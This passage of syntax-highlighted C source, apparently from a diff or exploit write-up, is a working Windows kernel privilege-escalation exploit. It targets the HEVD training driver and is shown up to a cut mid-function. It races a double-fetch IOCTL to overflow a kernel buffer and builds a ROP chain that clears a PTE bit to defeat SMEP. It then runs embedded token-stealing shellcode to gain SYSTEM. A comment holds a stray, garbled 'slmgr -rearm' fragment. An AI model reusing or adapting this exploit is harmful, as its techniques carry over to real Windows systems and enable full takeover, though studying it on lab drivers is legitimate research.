+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;processthreadsapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* IOCTL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DOUBLE_FETCH_IOCTL 0x222037
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Max threads */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define NUM_THREADS 5 </span><span style="color:#75715e">// 10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit Buffer */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER 0x900
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RETOVR 2064
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Double Fetch */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _DOUBLE_FETCH
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> Buffer;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> Size;
+</span></span><span style="display:flex;"><span>} DOUBLE_FETCH, <span style="color:#f92672">*</span>PDOUBLE_FETCH;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure for threads */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IRP_ARGS
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD;
+</span></span><span style="display:flex;"><span>  PDOUBLE_FETCH pDoubleFetch;
+</span></span><span style="display:flex;"><span>} IRP_ARGS, <span style="color:#f92672">*</span>PIRP_ARGS;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* TriggerRaceCondition():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     at runtime. If we win the race we successfully trigger a buffer overflow! */</span>
+</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#a6e22e">TriggerRaceCondition</span>(LPVOID lpParameters)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)lpParameters;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> BUFFER;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* TriggerWorkingCondition():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     condition. */</span>
+</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#a6e22e">TriggerWorkingCondition</span>(LPVOID lpParameters)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)lpParameters;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[!] Racing!!! Spraying Object(s): %p, Size: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch,
+</span></span><span style="display:flex;"><span>                                                                 pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(pIrpArgs<span style="color:#f92672">-&gt;</span>hHEVD,
+</span></span><span style="display:flex;"><span>                    DOUBLE_FETCH_IOCTL,
+</span></span><span style="display:flex;"><span>                    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch,
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">sizeof</span>(DOUBLE_FETCH),
+</span></span><span style="display:flex;"><span>                    NULL,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                    NULL);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GenerateExploitBuffer():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */</span>
+</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GenerateExploitBuffer</span>(LPVOID lpvNt, LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID lpvShellcode <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> nt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(lpvNt);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> sc[<span style="color:#ae81ff">129</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_sysret -f num (71)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x88</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x07</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#ae81ff">129</span>, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvShellcode <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory to house shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlCopyMemory</span>(lpvShellcode, sc, <span style="color:#ae81ff">129</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (RETOVR <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>)); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa4ea7d</span>; <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x57699c</span>;       <span style="color:#75715e">// pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvShellcode; <span style="color:#75715e">// *shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24aaec</span>;       <span style="color:#75715e">// MiGetPteAddress()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30fcf3</span>; <span style="color:#75715e">// sub rax, rdx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x54f344</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3788b6</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvShellcode;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Double Fetch */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAllocation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  HANDLE hThreadWork[NUM_THREADS] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  HANDLE hThreadRace[NUM_THREADS] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(IRP_ARGS));
+</span></span><span style="display:flex;"><span>  PDOUBLE_FETCH pDoubleFetchObject <span style="color:#f92672">=</span> (PDOUBLE_FETCH)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(DOUBLE_FETCH));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvMemoryAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                     BUFFER,
